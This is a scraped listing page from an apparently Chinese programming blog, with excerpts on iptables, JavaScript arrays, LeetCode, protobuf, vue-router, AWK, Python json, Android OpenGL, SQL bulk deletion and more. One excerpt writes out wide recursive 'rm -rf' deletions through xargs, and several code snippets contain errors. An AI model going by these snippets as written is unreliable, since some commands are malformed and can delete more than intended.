		
	</header>
	<div class="content list__excerpt post__content clearfix">
		http://www.zsythink.net/archives/tag/iptables/ 25个iptables常用示例 https://www.cnblogs.com/bill1015/p/6847841.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b5accb7ea28d3b3d00d0cf16204ece9b/" rel="bookmark">
			js-二维数组和多维数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js-二维数组和多维数组 一、二维数组的表示
myarray[][]
二、二维数组的定义
方法一：
1
2
3
4
5
6
7
var a = new Array();
for(var i=0;i&lt;3;i++){ //一维长度为3
a[i] = new Array();
for(var j=0;j&lt;5;j++){ //二维长度为5
a[i][j] = i+j;
}
}
方法二：
1
var a = [[1,2,3],[2,3,4]]；
三、赋值
1
myarr[1][2] = 5; //1表示第二行 ；2表示第3列
四、多维数组与二维数组类似
转自: https://www.cnblogs.com/foodoir/p/5723489.html
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3cfe522628ad5cd4da15f813f9ca1ec9/" rel="bookmark">
			LeetCode 347. 前K个高频元素(C&#43;&#43;)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目： 给定一个非空的整数数组，返回其中出现频率前 k 高的元素。
示例 1:
输入: nums = [1,1,1,2,2,3], k = 2 输出: [1,2] 示例 2: 输入: nums = [1], k = 1 输出: [1] 说明：
你可以假设给定的 k 总是合理的，且 1 ≤ k ≤ 数组中不相同的元素的个数。 你的算法的时间复杂度必须优于 O(n log n) , n 是数组的大小。
思路： 由于在本题中使用排序算法的复杂度不能满足复杂度必须优于 O(n log n)的要求，所以考虑采用优先队列实现。
class Solution { public: vector&lt;int&gt; topKFrequent(vector&lt;int&gt;&amp; nums, int k) { unordered_map&lt;int,int&gt; freq; //(元素，频率) for(int i = 0; i &lt; nums.size(); i++){ freq[nums[i]]++; } priority_queue&lt; pair&lt;int,int&gt;, vector&lt;pair&lt;int,int&gt;&gt;, greater&lt;pair&lt;int,int&gt;&gt; &gt; pq; //(频率，元素) for(auto a : freq){ if(pq.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3cfe522628ad5cd4da15f813f9ca1ec9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d2401cf054779fcfb9b4648349f302a/" rel="bookmark">
			protobuf-3.6 安装（Linux）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		官网下载：https://github.com/google/protobuf
https://github.com/google/protobuf/releases
protobuf-all-3.6.0.tar.gz
官网安装手册：https://github.com/google/protobuf/blob/master/src/README.md
安装：
tar zxvf protobuf-all-3.6.0.tar.gz
cd protobuf-3.6.0/ ./configure –prefix=/usr/local/protobuf(你的安装路径) make make check make install protoc –version
添加环境变量：vim ~/.bashrc export PATH=/usr/local/protobuf/bin/:$PATH export PKG_CONFIG_PATH=/usr/local/protobuf/lib/pkgconfig/
export LD_LIBRARY_PATH=/usr/local/protobuf/lib:$LD_LIBRARY_PATH
测试:
protoc –verison(查看版本)
which protoc(查看路径)
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f9eb148375110b461b78a70a1c14ac8d/" rel="bookmark">
			vue-router的两种模式及区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么要有 hash 和 history？
对于 Vue 这类渐进式前端开发框架，为了构建 SPA（单页面应用），需要引入前端路由系统，这也就是 Vue-Router 存在的意义。前端路由的核心，就在于 —— 改变视图的同时不会向后端发出请求。
为了达到这一目的，浏览器当前提供了以下两种支持：
hash —— 即地址栏 URL 中的 # 符号（此 hash 不是密码学里的散列运算）。 比如这个 URL：http://www.abc.com/#/hello，hash 的值为 #/hello。它的特点在于：hash 虽然出现在 URL 中，但不会被包括在 HTTP 请求中，对后端完全没有影响，因此改变 hash 不会重新加载页面。
history —— 利用了 HTML5 History Interface 中新增的 pushState() 和 replaceState() 方法。（需要特定浏览器支持）
这两个方法应用于浏览器的历史记录栈，在当前已有的 back、forward、go 的基础之上，它们提供了对历史记录进行修改的功能。只是当它们执行修改时，虽然改变了当前的 URL，但浏览器不会立即向后端发送请求。
因此可以说，hash 模式和 history 模式都属于浏览器自身的特性，Vue-Router 只是利用了这两个特性（通过调用浏览器提供的接口）来实现前端路由。
使用场景
一般场景下，hash 和 history 都可以，除非你更在意颜值，# 符号夹杂在 URL 里看起来确实有些不太美丽。 如果不想要很丑的 hash，我们可以用路由的 history 模式，这种模式充分利用 history.pushState API 来完成 URL 跳转而无须重新加载页面。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f9eb148375110b461b78a70a1c14ac8d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/409e8856f745f06fada9f91d82f49b4e/" rel="bookmark">
			Java 中的注释
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		编写注释的原因 编写程序时总需要为程序添加一些注释，用以说明某段代码的作用，或者说明某个类的用途、某个方法的功能，以及该方法的参数和返回值的数据类型及意义等。
编写注释的原因及意义如下
1、为了更好的阅读自己编写的代码，建议添加这注释。自己写的代码，可能过一段时间回顾的时候，就变得不熟悉。这个时候，注释就起到了很好的帮助作用。
2、可读性第一，效率第二。一个软件一般都是一个团队协同作战开发出来的。因此，一个人写的代码，需要被整个团队的其他人所理解。
3、代码即文档。程序源代码是程序文档的重要组成部分。
注释的语法规则 编写Java中的注释不会出现在可执行程序中。因此，可以在源程序中根据需要添加任意多的注释，而不必担心可执行代码会膨胀。在 Java 中，有三种书写注释的方式。
1、单行注释
2、多行注释
3、文档注释
下面分别详细的介绍这三种注释。
单行注释：是最常用的注释方式，其注释内容从 "//"开始到本行末尾。
// 作者：louis. // 日期：08/26. // 类名：FirstSample. // 作用：一个简单的 Java 应用程序. public class FirstSample { // main 方法，Java 应用程序的入口 public static void main(String[] args) { // 向控制台输出语句 "Hei,Hei". System.out.println("Hei,Hei"); // 下面这句代码被注释掉了，不会执行！ // System.out.println("Hei,Hei! Again."); } }// FirstSample 类的所有成分都应该定义在 FirstSample 类的一对大括号（"{}"）内. 多行注释：注释内容放到 "/*" 和 "*/"之间。也即是，注释从 "/*" 开始，到 "*/" 结束。
/* 作用：louis. */ /* 日期：08/26. */ /* 类名：FirstSample.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/409e8856f745f06fada9f91d82f49b4e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b6b600a723e9b2ebcb30ac71d2600393/" rel="bookmark">
			2018计算机保研夏令营情况介绍（清华，人大，北航，中科院计算所，中科院软件所，南大）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本人从2018年5月份开始准备保研的事情，下面就自身情况，材料准备，高校夏令营条件，机试或笔试题目，面试形式等做一个介绍。在申请的学校中，除了北大信科被拒了以外，其他都取得了入营资格。下面也主要介绍一下最终去了的学校： 清华软件学院，人大信息学院，北航计算机学院，中科院软件所，中科院计算所，南大计算机学院。
也特别说明一下，我没有报上交以及浙大，浙大是没有夏令营的，不过有暑期实习，十分想去浙大的同学可以去申请。因为持续时间比较长，往往意味你要放弃很多其他的夏令营，所以请谨慎选择。
希望能帮助到学弟学妹，也先预祝你们都能被理想的学校录取。
==================================================================================
一、自身情况： 1.1 作为对比，先简单介绍一下自己的情况 本科：某中等985大学，计算机科学与技术专业
综合成绩 : rank1
Cet-6 : 583
获奖：一次国家级奖项，一次省级奖项 ,几项校级奖项。
科研: 以第一作者发表了SCI论文一篇。
1.2 科研相关介绍 一般情况下，对有比较完整的科研经历的同学，老师都会注重去问你科研以及论文相关的问题。其中最常见的问题有：
1.你的导师在本次研究中起到的作用
必问，主要还是怕你的论文是划水的。其中好像主要是看你在研究工作与论文撰写两个部分的贡献程度。因为我是一作，而且除了我的导师以外没有其他合作者，所以还是很认可的。
2.请简单讲述你的科研经历的全部过程。
我这里是分成了5个阶段，其他科研工作者的论文阅读与理解，算法实现与模拟，迭代优化算法，中文论文撰写，翻译与投稿。所以问的其他问题我也主要按照了我自己的这个过程进行回答的。
3.你的整个科研过程 或者 实验模拟与论文撰写与翻译分别花了大概多少时间？
主要是考察你的专业研究基础能力，论文撰写能力以及英语能力，这个不是减分项，是加分项
4.你所做的研究最大的创新点在哪？
5.简单的讲一下你的翻译过程。
这里建议有过科研经历的同学都准备一下3~5分钟简介自己的科研工作全过程与论文主要创新点。
1.3 补充说明 有科研经历的话确实在大多数面试中有不小的优势，很多情况下面试老师会着重问你这段经历相关的事情。只要你做的科研工作不是特别灌水的那种，而且确实起到了最核心作用，基本都是挺认可的，严格一点的话可能还会对你的不严谨的地方提出一些建议，但是这都不重要不用慌。当然，如果你没有科研经历的话也不要紧，可以注重介绍你的竞赛与项目经历。这两个往往是放在一起的，这样老师会询问你在工程项目中所做的工作。
以及我报的是分布式系统与大数据处理的方向，之后有一些面试的问题是相关的，也就不再赘述。
==================================================================================
二、材料准备 1.个人简历 会用到大量的，彩色还是黑白看个人喜好，内容一定要简介明了，让老师能快速的解到你的信息！面试的时候建议多发几份。
2.获奖复印件 3.成绩单复印件（包括46级） 4.专家推荐信 部分学校需要，一般2封。另外，推荐信一般都是自己写（用长辈的口吻有所保留的夸自己，还真需要点东西）然后给老师看看再找老师签字，找本校的认识的就行。
5.论文原文 如果有的话，一定要打印，每次面试的时候最好带进去一份完整的。
6.个人介绍PPT 这个不是必须，少数学校会用到。你在和老师联系的时候也可以用到，主要是个人简历的扩展版，还是以简介明了为重点，不要弄的花里胡哨的。
另外面试会问的3个英文问题一般有：自我介绍、介绍一下你的家乡或者你的学校。后两项有时间的可以稍微准备一下，被问到的概率不大。
==================================================================================
三、各校夏令营介绍 3.1清华大学软件学院 时间: 6.9~6.10
简介: 应该是开始最早的夏令营了，5月初开始报名的。夏令营不会给明确的offer，而且以直博招生为主，主要还要靠后续与导师的联系。考核方式有机试和面试，都仅作参考不换算排名分。
机试： 总共5题，考3个小时。隔的有点久忘了一些，还记得3道题，考试环境是vs2013。没有OJ,做完以后保存在本地会有人来拷贝并判断。会告诉你它的测试大致数据范围，比如： 对于80%的数据n&lt;1e6，对于20%的数据n&lt;1e9。最终成绩不知道，具体题目如下：
1.简单模拟，挺好做的，具体忘了
2.给一组凸函数上的点(x,y)，再给定一个斜率k，求这组点中，哪两个点相连所构成的直线的斜率与k最接近。这题要用二分，不然大数据量的测试样例应该是会超时的。
3.给一组质数，求能整除其中至少一个数的第k大的数。比如给2 3 5第k=6大的就是8（2,3,4,5,6,8,10…）。这题用优先队列(最小堆)，先把n个质数都进队。每次队首元素出队，依次乘以n个质数后再放回队列中，找到第k个出队的就是了。
4.忘了
5.给一个无向图的顶点以及边的信息。然后问你，如果现在可以将其中一条边的长度减小一半，那么从0号点到第n号点的最短路径是什么。要依次打印减半的那条边的编号，路径总长，和路径上的各个点。这题我不会，用了贪心+dj骗一点最简样例的分数。解法的话只想到了用dj+剪枝优化，用启发式算法做，真的不会了也没时间写了。
面试： 以询问论文为主。没有问专业问题。在一个会议室里，氛围非常好，是10个左右老师面一个，但是不会觉的很紧张。然后老师让我简述了自己对分布式系统的认识与理解，然后问了下是否了解区块链。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b6b600a723e9b2ebcb30ac71d2600393/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/63f403cffef8f83a3ddff9116367044f/" rel="bookmark">
			二维矩阵中的最大矩形面积--java实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、原题： 给你一个二维矩阵，权值为False和True，找到一个最大的矩形，使得里面的值全部为True，输出它的面积。
样例：
给你一个矩阵如下：
[ [1, 1, 0, 0, 1], [0, 1, 0, 0, 1], [0, 0, 1, 1, 1], [0, 0, 1, 1, 1], [0, 0, 0, 0, 1] ] 输出6
二、解题思路： 1、首先，第一种解题方法，也就是最简单最容易想到的方法，就是暴力遍历二维数组中的每一个元素，然后求出该元素所在区域的最大矩形的面积，但是这种方法的时间复杂度太高，不建议这样子做。
2、接下来，介绍另外一种方法： Histogram法
根据下图，可以看出本题可以转化为Largest Rectangle in Histogram来做。
看到这里，可能有些人会不明白什么是Histogram法，那么，在贴出本题的解决代码之前，我们先介绍一下什么是Histogram法。
三、Histogram法： 本部分参考博客：https://blog.csdn.net/hopeztm/article/details/7868581
1、题目大意：
给出一个柱形统计图(histogram), 它的每个项目的宽度是1， 高度和具体问题有关。 现在编程求出在这个柱形图中的最大面积的长方形。
例如：
7 2 1 4 5 1 3 3
7表示柱形图有7个数据，分别是 2 1 4 5 1 3 3， 对应的柱形图如下，最后求出来的面积最大的图如右图所示。
2、分析：
如果采用枚举的方式，如果当前我们枚举项是 i = 0, 即 height = 2时， 我们用另外两个变量 j 和k 向左和向右两个方向搜素，分别找到第一个小于当前height的下标，这样我们就可以算出用 i 项作为高度长方形的面积了。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/63f403cffef8f83a3ddff9116367044f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8d0abf415824acd6ec54e8364c8aed0c/" rel="bookmark">
			AWK 字符串处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		字符串处理的另外一个强大的工具是AWK， 与SED不同的是AWK更加擅长对字符串进行切分， 进行列处理。
语法 awk [ -F re] [parameter…] [‘prog’] [-f progfile] 参数说明： -F re：允许awk更改其字段分隔符，默认是空格。 parameter: 该参数帮助为不同的变量赋值。 ‘prog’: awk的程序语句段。这个语句段必须用单拓号：’和’括起，以防被shell解释。 这个程序语句段的标准形式为：’pattern {action}’ -f progfile: 满足AWK语法的程序文件；
常用的内置变量 FIELDWIDTHS 以空格分隔的字段宽度，如果指定此变量，awk将会用指定的宽度替换变量FS指定的分隔符。
echo "abcdefghijkl" | awk 'BEGIN {FIELDWIDTHS="2 3 4"}' 输出： ab cde fghi NF 当前记录中的字段个数。
NR 已经读出的记录数。
FILENAME 文件名 OFS 输出字段分隔符， 默认也是空格，可以改为制表符等
ORS 输出的记录分隔符，默认为换行符,即处理结果也是一行一行输出到屏幕
内置函数 gsub(r,s)在整个$0中用s代替rgsub(r,s,t)在整个t中用s替代rindex(s,t)返回s中字符串t的第一位置length(s)返回s长度match(s,r)测试s是否包含匹配r的字符串split(s,a,fs)在fs上将s分成序列asprint(fmt,exp)经fmt格式化后的expsub(r,s)用$0中最左边最长的子串代替ssubstr(s,p)返回字符串s中从p开始的后缀部分substr(s,p,n)返回字符串s中从p开始长度为n的后缀部分 常用实例 基本输出格式 awk -F: '{print $1,$3,$6}' OFS="\t" file_name 以：为分隔符， 输出字段1,3,6，以制表符作为分隔符
awk -F: 'NR==4 || NR==8{print}' file_name 显示第5行和第6行
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8d0abf415824acd6ec54e8364c8aed0c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da1436baa215226a0ca4670a093aefa8/" rel="bookmark">
			Python中用json.load() json.loads()加载json数据的方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Json模块dumps、loads、dump、load函数介绍
1、json.dumps()
json.dumps()用于将dict类型的数据转成str，因为如果直接将dict类型的数据写入json文件中会发生报错，因此在将数据写入时需要用到该函数。
import json name_emb = {'a':'1111','b':'2222','c':'3333','d':'4444'} jsObj = json.dumps(name_emb) print(name_emb) print(jsObj) print(type(name_emb)) print(type(jsObj)) 运行结果如下： {'a': '1111', 'c': '3333', 'b': '2222', 'd': '4444'} {"a": "1111", "c": "3333", "b": "2222", "d": "4444"} &lt;type 'dict'&gt; &lt;type 'str'&gt; 若在数据写入json文件时，未先进行转换，报错如下 import json name_emb = {'a':'1111','b':'2222','c':'3333','d':'4444'} emb_filename = ('/home/cqh/faceData/emb_json.json') # jsObj = json.dumps(name_emb) with open(emb_filename, "w") as f: f.write(name_emb) f.close() 转换后再写入，则不报错
2、json.loads()
json.loads()用于将str类型的数据转成dict。
import json name_emb = {'a':'1111','b':'2222','c':'3333','d':'4444'} jsDumps = json.dumps(name_emb) jsLoads = json.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da1436baa215226a0ca4670a093aefa8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36ff6db2c47e5b47499934aecfc9db9a/" rel="bookmark">
			Android使用NDK  OpenGL ES3.0绘制一个三角形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Android使用NDK OpenGL ES3.0绘制一个三角形 【尊重原创，转载请注明出处】https://blog.csdn.net/guyuealian/article/details/82021607
网上已经有很多OpenCV的教程，不过大都是基于Java层调用openGL接口，若使用Java层openGL接口绘制三角形，还是比较简单的，但要是使用NDK C++ 实现，还是有点复杂。
本文将使用Android NDK开发，利用C++的 OpenGL ES3.0绘制一个三角形。绘制三角形的C/C++源码大部分是参考：《OPENGL ES 3.0编程指南 》第二章的代码，但该书只有源码，没有工程项目，是用Android.mk配置，要做成Android Studio Demo还是要花点力气的。本博客的OpenGL的开发，其配置文件使用CMakeLists.txt，Android Studio 2.3以上NDK开发很容易啦，其配置方法使用CMakeLists.txt会比使用Android.mk更容易。
这里不具体分析绘制三角形的代码实现过程了，毕竟《OPENGL ES 3.0编程指南 》这本书已经很详细啦。
本项目源码下载地址：https://github.com/PanJinquan/openGL-Demo ，要是觉得不错，给个”Star“哈
开发环境：
（1）Android Studio 2.3.3 以上（2）android-ndk-r10d 以上，下载地址：https://developer.android.google.cn/ndk/downloads/index.html 1、新建项目： 新建Android工程一定要勾选“Include C++ support”，这样新建的Android工程会直接支持NDK开发，避免各种配置问题，如果提示没有NDK，请下载NDK，并在工程“Project Structure”中导入即可。
我的工程目录是这样的：
2、新建RendererJNI类 package opengl.panjq.com.opengl_demo; import android.opengl.GLSurfaceView.Renderer; import javax.microedition.khronos.egl.EGLConfig; import javax.microedition.khronos.opengles.GL10; import android.content.Context; import android.content.res.AssetManager; import android.opengl.GLSurfaceView; import android.util.Log; public class RendererJNI implements GLSurfaceView.Renderer { static { System.loadLibrary("gltest-lib"); } private AssetManager mAssetMgr = null; private final String mLogTag = "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36ff6db2c47e5b47499934aecfc9db9a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1aaf1596f66d629ff9a9db1735176a85/" rel="bookmark">
			安卓（JAVA）已知两点经纬度，求出一条线上几等分的点的经纬度。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		话不多说，直接上代码。 /** * 计算两点之间等距的经纬度 */ private List&lt;LatLng&gt; getDengLatLng(int number) { double aaa, bbb, ccc = 0, ddd = 0; List&lt;LatLng&gt; latLngs = new ArrayList&lt;&gt;(); for (int i = 1; i &lt; number + 1; i++) { if (latLng_a.longitude &gt; latLng_b.longitude &amp;&amp; latLng_a.latitude &gt; latLng_b.latitude) { aaa = (latLng_a.longitude - latLng_b.longitude) / (number + 1); ccc = latLng_b.longitude + aaa * (i); bbb = (latLng_a.latitude - latLng_b.latitude) / (number + 1); ddd = bbb * (i) + latLng_b.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1aaf1596f66d629ff9a9db1735176a85/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6e75a08c3f1ed5d4f2e0d3a0b10290cc/" rel="bookmark">
			四种解决”Argument list too long”参数列表过长的办法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		四种解决”Argument list too long”参数列表过长的办法 转自
http://hi.baidu.com/cpuramdisk/item/5aa49ce00c0757aecf2d4f24
在linux中删除大量文件时，直接用rm会出现：-bash: /bin/rm: 参数列表过长，的错误。
这时可以用find命令来结合使用。
例：
1、rm * -rf 改为:
find . -name "*" | xargs rm -rf '*' 就行了。
2、rm test* -rf 改为:
find . -name "test*" | xargs rm -rf "test*"
mv时报参数列表过长，
for i in *.m;do mv $i ${i%.m};done
于是求助于google，探索过程就省略了，直接说解决方法吧：
ls dir1 | xargs -t -I {} mv {} dir2/{}
这里的一对大括号是原文给的例子里用的，后来看了参数的用法，其实那对大括号是可以用任意字符串替换的，比如：
ls dir1 | xargs -t -I asdf mv asdf dir2/asdf
效果和大括号那一版是完全一样的，就是看起来有点儿不严肃。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/6e75a08c3f1ed5d4f2e0d3a0b10290cc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eaaaef9447db62783c606327a385d205/" rel="bookmark">
			桌面分享编码技术的演变
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		By 技术怪咖 汤军
导读：桌面分享从功能上应该怎么分？数据编码的技术演变又是如何演变的？资深工程师汤军结合自己多年的实操经验给出独到见解。
由于最近两份工作分别在“在线教育”和“视频会议”领域，在这两个领域对用户而言最重要的功能除了语音就是桌面分享，恰巧这也是我所擅长的领域。桌面分享从功能上可以拆分为屏幕抓取与数据编码两个大的方面。其中屏幕抓取，主要获取数据源，在当前的机器的运算能下，该功能已不再是瓶颈，所以我们下面主要聊聊数据编码的技术演变。
桌面分享功能脱胎于远程桌面技术
桌面分享功能脱胎于远程桌面技术。最早的远程桌面是基于命令行界面的模拟终端。此时并不涉及到抓屏与编码，终端与远端机器之间通讯的是shell命令，以及命令的执行结果，对机器的性能以及网络代码的需求很低。随着Win95系统上市并且成功引爆图形界面操作系统市场，受限于当时机器的性能以及网络带宽，在相当长一段时间中都没有出现针对图形操作系统的远程桌面工具。直到Windows2000上市，微软在其中提供了远程桌面组件，才第一次实现了基于图形界面的远程桌面。
早期的图形界面的分辨率比较低（800*600），颜色数比较少（以16位色居多，24位真彩色很少见）。然而就算这样，屏幕数据量（937KB）对于当时的宽带网络（ADSL拨号上网，上传带宽512kb~1Mb）也是个沉重的负担，理论上以当时的网络，传递一帧未压缩的屏幕数据需要用时8~16秒，这显然无法接受。为了能更快的将桌面图形快速的通过网络传递到终端，桌面数据的压缩编码就应运而生了。
桌面数据压缩之初，主要被用来解决帧数据过大这个问题。所以首先被应用的就是当时很流行的图片数据有损压缩方法（JPG），该压缩算法在图片质量下降不是很明显的情况下，压缩后的图片仅为原大小的10%。在使用了JPG压缩算法后，对于观看远端静态文档暂时勉强够用。
为了能进一步减少传输间隔，在没办法减少每一帧数据大小的情况下，我们问自己，每一次都传输完整的帧数据，就是是否必须？经过分析，我们发现桌面发生完全变化的概率很少，绝大部分都是局部变化，如：按钮获取焦点，某个控件数据获得更新等。
针对“痛点”，研究解决问题
为此我们设计了分块编码的策略：首先将整个桌面数据分块(见下图)，然后每一个分块在编码前先与上一帧对应的分块进行比较，仅当数据发生了变化时，才使用JPG算法压缩。每次只传输发生变化的分块的数据，接收端总是在上次展示的帧数据上做修改。如此，在不降低第一帧数据延迟的情况下，大大减少了其他帧数据的延迟。
在实际使用中发现，对于纯文本展示（文本文件、PPT、静态网页等），使用JPG方法压缩后字体的背景不是很干净。放大图片后发现文本显示的边缘与背景融合处使用了渐变色过渡。而JPG压缩会丢失这部分信息的细节。对于纯文本展示（文本文件、PPT、静态网页等）的桌面数据观察发现，大部分为少数颜色的文本加大面积单色的背景。对于这种类型数据恰巧可以使用基于调色盘的无损压缩。我们又再次改进了之前的编码策略。在已经判定块需要编码的情况下，再分析块中使用的颜色数，依据颜色数的不同选择不同的编码方式。
随着机器性能的持续提升，显示器的分辨率越来越高，1080P全高清成为主流，4K屏也不鲜见，并且越来越多。用户在使用PPT等展示数据时，复杂背景、植入的图表（视频），翻页的动画效果，全都越来越多。网络带宽虽然也有提升，但完全跟不上机器性能提升的速度。上述的编码方案在桌面短时间发生剧烈改变时，产生了大量的爆发数据。而按上述方案，后续数据的显示又必须依赖前面数据的更新。由于爆发数据导致的数据积压，使得桌面分享实时性越来越差。分析上述场景，我们发现在用户切换PPT页面的动画播放期间，可能产生了5帧画面，并且这5帧画面的变化都比较大，如果一一进行编码传输，会导致传输在短期出现一个峰值，超出了带宽的承载能力。但是相对于页面切换动画，观看者更期望能更快的看到下一页的PPT。为此，我们引入了延迟编码的策略，当桌面两帧数据之间的差异很大的时候，我们暂存待编码的帧，等待下一帧数据，同时开始计时。下一帧数据获取后，该帧和待编码的帧之间的差异如果很大，用该帧代替待编码帧，继续等待；如果该差异比较小，丢弃待编码的帧，编码当前帧数据并发送到观看端。如果两帧之间的差异一直很大，那么当计时器（500毫秒）超时后，编码当前等待帧，并复位定时器。在全时云会议的开发项目中，我们设计并实现了上面的延迟编码策略，显著加快了复杂PPT页面切换时的观看延迟。
新时代新技术对我们来说是双刃剑
从2007年以来，视频流媒体技术得到了长足的进步。从早期H261、H263到现在的H264，以及为了应对目前越来越普及的超高清（4k分辨率）视频而出现的H265和VP9、VP10编码。
而用户对桌面共享的流畅性的期望越来越向视频的流畅度靠拢，这使得我们不得不考虑，桌面数据的压缩方式是否能使用视频的压缩方法。我们发现，桌面数据走视频流的模式对于持续变化的桌面分享有显著的削峰填谷效果。
视频编码在应对持续变化的时候，可以通过短期（毫秒级）降低画面质量的办法来控制爆发数据波峰，等到画面变化停止的瞬间立刻将画面质量提升上来。我们有理由相信，视频流媒体的编码方式是桌面共享支持高清、超高清画面的“银弹”。
以上的技术探索历程，实际上耗费了相当的时间精力，而且是个持续改进的过程，因为产品和技术的迭代本身就不是件一劳永逸的事。仅笔者所在的团队，5个人，7年多以来一直在“发现问题-认证分析-改进-发现问题”的循环中，而且预计以后也是这样，不在改进，就在改进的路上，但是从各种反馈看来，效果的确不错。前几年有一次客户环境下测试，全时云会议就比另一个国外大牌效果要好很多，比另一个产品早了几分钟接通对方而且会议效果很不错，不枉我们的努力心血，当然这也是纯自主研发的技术好处，直接把国外技术拿来用，在国内这种网络条件下，基本可以肯定要水土不服。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5f3c3e2a2ef3b325aeed2c92ca197ca1/" rel="bookmark">
			MSSQL、MySQL 数据库删除大批量千万级百万级数据的优化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		SQL Server上面删除1.6亿条记录，不能用Truncate（因为只是删除其中少部分数据）。
经过实验，每次删除400万条要花1.5 - 3小时，而且是越到后面越慢，正常的话，需要大约102个小时，大约4天半时间。这在生产环境下是不能接受的。
经过一个处理之后，我每次删除400万条记录花5 - 6分钟，删除全部1.6亿条记录花了4 - 5个小时！
为什么？？
每次删除记录，数据库都要相应地更新索引，这是很慢的IO操作，而且后面索引碎片越来越多，就更慢，这就是为什么一开始只花1.5小时，后面要3小时才能删除400万条记录的原因。
删除之前，做个完整备份。
我在删除前先保存当前索引的DDL，然后删除其索引，
然后根据使用的删除条件建立一个临时的索引（这是提高速度的另外一个重要原因！）
开始删除操作，完成之后再重建之前的索引。
如果需要保留的数据比较少的话，可以把要保留的数据备份出来。在drop表。重新创建，先不要急着创建索引、主键，把数据导回去，然后在建索引、约束之类的。
记得在删除的时候不要在记录日志的模式下面，否则日志文件就要爆了。
2、在My SQL数据库使用中，有的表存储数据量比较大，达到每天三百万条记录左右，此表中建立了三个索引，这些索引都是必须的，其他程序要使用。 由于要求此表中的数据只保留当天的数据，所以每当在凌晨的某一时刻当其他程序处理完其中的数据后要删除该表中昨天以及以前的数据，使用delete删除表中的上百万条记录时，MySQL删除速度非常缓慢每一万条记录需要大概4分钟左右，这样删除所有无用数据要达到八个小时以上，这是难以接受的。
查询MySQL官方手册得知删除数据的速度和创建的索引数量是成正比的，于是删除掉其中的两个索引后测试，发现此时删除速度相当快，一百万条记录在一分钟多一些，可是这两个索引其他模块在每天一次的数据整理中还要使用，于是想到了一个折中的办法：
在删除数据之前删除这两个索引，此时需要三分钟多一些，然后删除其中无用数据，此过程需要不到两分钟，删除完成后重新创建索引，因为此时数据库中的数据相对较少，约三四十万条记录(此表中的数据每小时会增加约十万条)，创建索引也非常快，约十分钟左右。这样整个删除过程只需要约15分钟。对比之前的八个小时，大大节省了时间。
转载于:https://blog.51cto.com/wenzengliu/2163771
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5923064f8833019dab467ad0d7901962/" rel="bookmark">
			Javascript和C&#43;&#43;之间的结构体对象传递
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.c++层接口：Decoder.cpp
